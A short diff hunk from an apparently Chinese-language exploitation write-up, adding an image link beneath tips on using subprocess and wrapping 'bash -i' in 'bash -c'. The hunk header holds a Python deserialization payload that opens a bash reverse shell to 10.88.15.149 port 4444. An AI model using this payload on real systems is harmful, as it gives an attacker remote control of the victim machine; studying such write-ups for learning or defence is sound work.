@@ -513,3 +513,5 @@ return (subprocess.run, (["bash", "-c", "bash -i >& /dev/tcp/10.88.15.149/4444 0
 1. subprocess 这个库同样有可执行任意系统指令的敏感函数, 注意甄别;
 2. `bash -i` 不能直接执行成功的时候, 考虑先用 `bash -c` 套一层在外面, 毕竟不是直接在 bash 里操作;
 
+![25-5.png](25-5.png)
+
